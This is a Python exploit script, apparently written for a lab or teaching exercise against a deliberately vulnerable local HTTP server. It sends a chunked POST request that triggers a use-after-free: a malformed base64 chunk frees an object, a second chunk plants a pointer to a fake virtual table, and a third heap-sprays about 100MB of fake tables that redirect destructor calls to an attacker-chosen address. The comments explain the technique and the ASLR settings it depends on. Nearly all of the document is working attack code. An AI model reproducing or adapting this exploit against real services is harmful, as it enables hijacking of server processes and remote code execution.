#!/usr/bin/env python3


import struct
from argparse import ArgumentParser
from base64 import b64encode
from functools import partial
from http.client import HTTPConnection


POINTER_SIZE = 4
CHUNK_OBJECT_SIZE = 12
# Threshold for the buffer size above which the address specified with --buffer-address is always included in the buffer
# with a 32-bit executable. To even get different start addresses for buffers of this size, we need to increase the number
# of random bits for mmap() by setting /proc/sys/vm/mmap_rnd_compat_bits to 14, the default seems to be 8. With 16 bits,
# the maximum, we'd need a buffer size of probably 1GB.
FIXED_ADDR_BUFFER_SIZE_THRESHOLD = 0x06400000  # 100MB


def main():
    parser = ArgumentParser()
    parser.add_argument("--target-host", "-H", default="localhost")
    parser.add_argument("--target-port", "-P", type=int, default=9999)
    parser.add_argument("--pwned-dtor-address", type=partial(int, base=16), required=True)
    parser.add_argument("--buffer-address", type=partial(int, base=16), required=True)
    args = parser.parse_args()

    conn = HTTPConnection(args.target_host, args.target_port)
    conn.connect()
    input("Press any key to send request... ")
    conn.request(
        "POST",
        "/",
        headers={
            "Content-Type": "application/octet-stream",
            "Transfer-Encoding": "chunked"
        },
        encode_chunked=True,
        body=[
            # 1st chunk with incorrectly base64-encoded data (just one character) that results in an error when the
            # target tries to decode it. The corresponding chunk object will be overwritten by the 2nd chunk.
            b"x",

            # 2nd chunk, contains the pointer to the fake virtual table delivered in the 3rd chunk. The size of the
            # base64-decoded chunk has to be the same as the size of the chunk objects so the buffer for the decoded
            # data will re-use the memory of the freed object from chunk 1. Thereby we replace the original table.
            b64encode(
                struct.pack("<L", args.buffer_address) +   # pointer to virtual table
                b"x" * (CHUNK_OBJECT_SIZE - POINTER_SIZE)  # to fill the buffer
            ),

            # 3rd chunk
            # We construct a fake virtual table with pwned_destructor() as a replacement for the real destructor(s).
            # See https://shaharmike.com/cpp/vtable-part1/ and
            # https://www.martinkysel.com/demystifying-virtual-tables-in-c-part-3-virtual-tables/ for details.
            # To account for different start addresses of the buffer for the base64-decoded chunk, we heap-spray the
            # complete buffer with instances of the table and use an address that is guaranteed to be in the buffer as
            # pointer to the table in the 2nd chunk.
            b64encode(b"".join(
                [
                    struct.pack("<L", args.pwned_dtor_address) +  # pointer to the complete object destructor
                    struct.pack("<L", args.pwned_dtor_address)    # pointer to the deleting destructor
                    for x in range(0, int(FIXED_ADDR_BUFFER_SIZE_THRESHOLD / (2 * POINTER_SIZE)))
                ]
            )),
        ]
    )
    resp = conn.getresponse()
    print(f"Target replied with status {resp.status} {resp.reason}")

    input("Press any key to close connection...")
    conn.close()


if __name__ == '__main__':
    main()
